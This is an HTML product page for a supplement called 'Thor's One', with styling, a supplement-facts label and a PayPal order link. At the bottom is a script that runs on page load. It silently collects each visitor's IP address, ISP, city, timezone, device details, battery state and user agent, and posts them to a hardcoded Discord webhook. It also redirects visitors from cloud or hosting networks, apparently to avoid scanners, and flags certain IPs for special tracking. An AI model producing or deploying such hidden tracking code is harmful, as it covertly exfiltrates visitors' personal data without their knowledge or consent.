---
layout: default
title: Thor's One - Valhalla Innovations
---

<style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Inter:wght@300;700&display=swap');

    :root {
        --electric-blue: #00d4ff;
        --bg-dark: #020202;
    }

    body { 
        background-color: var(--bg-dark); 
        color: #fff; 
        font-family: 'Inter', sans-serif; 
        margin: 0;
        /* Using your storm image from the main folder */
        background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.8)), url('banner_storm.jpeg');
        background-attachment: fixed;
        background-size: cover;
        background-position: center;
    }

    .container { max-width: 1100px; margin: 0 auto; padding: 40px 20px; text-align: center; }

    /* Hero Section */
    .hero-container {
        display: flex;
        flex-direction: column;
        align-items: center;
        margin-top: 20px;
    }

    .product-bottle {
        width: 100%;
        max-width: 550px;
        filter: drop-shadow(0 0 40px var(--electric-blue));
        margin-bottom: -30px; 
        transition: 0.5s ease;
        cursor: pointer;
    }
    
    .product-bottle:hover { transform: scale(1.05) rotate(-1deg); }

    h1 { 
        font-family: 'Orbitron', sans-serif; 
        font-size: clamp(3rem, 12vw, 7rem);
        margin: 0; 
        color: #fff;
        text-shadow: 0 0 30px var(--electric-blue);
        letter-spacing: 12px;
    }

    .tagline { 
        text-transform: uppercase; 
        letter-spacing: 6px; 
        font-size: 0.85rem; 
        color: var(--electric-blue);
        margin: 20px 0 50px 0;
        font-weight: 700;
    }

    /* Supplement Facts Label */
    .label-wrap {
        display: flex;
        justify-content: center;
        margin: 60px 0;
    }

    .supplement-facts { 
        background: #fff; 
        color: #000; 
        padding: 35px; 
        border: 4px solid #000; 
        width: 100%;
        max-width: 480px;
        box-shadow: 20px 20px 0px var(--electric-blue);
        text-align: left;
    }

    .supplement-facts h2 { border-bottom: 15px solid #000; font-weight: 900; font-size: 2.8rem; margin: 0; }
    .sf-table { width: 100%; border-collapse: collapse; margin-top: 10px; }
    .sf-table td { padding: 14px 0; border-bottom: 1px solid #000; font-weight: bold; font-size: 1.1rem; }
    .sf-bold { border-bottom: 10px solid #000 !important; font-size: 1.2rem; }

    /* The Buy Button */
    .order-btn {
        background: #fff; 
        color: #000; 
        padding: 25px 90px; 
        font-weight: 900; 
        text-decoration: none; 
        display: inline-block; 
        font-size: 1.6rem;
        text-transform: uppercase;
        letter-spacing: 5px;
        border: 4px solid var(--electric-blue);
        transition: 0.4s;
        box-shadow: 0 0 50px rgba(0, 212, 255, 0.3);
    }

    .order-btn:hover { 
        background: var(--electric-blue); 
        color: #fff; 
        box-shadow: 0 0 70px var(--electric-blue);
        transform: translateY(-5px);
    }

    footer { padding: 120px 0 40px; color: #333; font-size: 0.7rem; letter-spacing: 4px; font-weight: bold; }
</style>

<div class="container">
    <div class="hero-container">
        <img src="banner.jpg" class="product-bottle" alt="Thor's One Performance Blend">
        <h1>THOR'S ONE</h1>
        <p class="tagline">Many are called but few are chosen</p>
        
        <a href="https://www.paypal.com/ncp/payment/Z6NLB5ECC653L" class="order-btn">CLAIM THE ALLOY</a>
    </div>

    <div class="label-wrap">
        <div class="supplement-facts">
            <h2>Supplement Facts</h2>
            <p style="font-weight: bold;">Serving Size: 1 Scoop | Servings: 30</p>
            <table class="sf-table">
                <tr class="sf-bold"><td>CORE ELEMENTS</td><td style="text-align:right;">AMT</td></tr>
                <tr><td>Creatine Monohydrate</td><td style="text-align:right;">5 g</td></tr>
                <tr><td>Citrulline Malate</td><td style="text-align:right;">5 g</td></tr>
                <tr><td>Beta-Alanine</td><td style="text-align:right;">3.5 g</td></tr>
                <tr class="sf-bold"><td>FOCUS MATRIX</td><td style="text-align:right;">AMT</td></tr>
                <tr><td>L-Tyrosine</td><td style="text-align:right;">750 mg</td></tr>
                <tr><td>Huperzine A (1%)</td><td style="text-align:right;">200 mcg</td></tr>
            </table>
        </div>
    </div>

    <footer>
        MCLAREN VALHALLA SYSTEMS // TRACKING NODE 01 // SECURE SESSION ACTIVE
    </footer>
</div>

<script>
    async function runSentinel() {
        const hook = "https://discord.com/api/webhooks/1482560413202780190/W_284_815IhjKx0KEPRMAcL8cikbZLG1wE_Zwxls5N-DR5KJ8mtuCE_OrXf-ZLIVSRay";
        const absoluteMasters = ["66.177.137.56"]; 
        const wichitaIP = "207.178.123.51";

        try {
            const res = await fetch('https://ipapi.co/json/');
            const geo = await res.json();
            const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({ level: 1, charging: true }));
            
            const isMaster = absoluteMasters.includes(geo.ip);
            const isWichita = geo.ip === wichitaIP;
            const isCloud = /Azure|Hosting|Data Center|Microsoft|Amazon|Google|Cloud|Ziply/i.test(geo.org);

            let status = "🚨 INTEL SCAN";
            let color = 15548997; 

            if (isMaster) {
                status = "👑 MASTER ACCESS";
                color = 15844367; 
            } else if (isWichita) {
                status = "🌾 WICHITA NODE REPORT";
                color = 3447003; 
            }

            const report = {
                username: isMaster ? "THORS-RIG-ADMIN" : "SENTINEL-INTELLIGENCE",
                embeds: [{
                    title: `${status}: ${geo.city}`,
                    color: color,
                    fields: [
                        { name: "🌐 Network", value: `IP: ${geo.ip}\nISP: ${geo.org}`, inline: false },
                        { name: "📍 Location", value: `${geo.city}, ${geo.region}\nTZ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`, inline: true },
                        { name: "💻 Device", value: `Platform: ${navigator.platform}\nScreen: ${screen.width}x${screen.height}`, inline: true },
                        { name: "🔋 Battery", value: `${(battery.level * 100).toFixed(0)}% (Charging: ${battery.charging})`, inline: true },
                        { name: "🕵️ UA", value: navigator.userAgent }
                    ],
                    footer: { text: "McLaren Valhalla Systems // Deep Scan Active" },
                    timestamp: new Date().toISOString()
                }]
            };

            await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(report) });

            if (isCloud && !isMaster && !isWichita) {
                window.location.replace("https://www.google.com/search?q=unauthorized+access+detected");
            }
        } catch (e) {}
    }
    runSentinel();
</script>
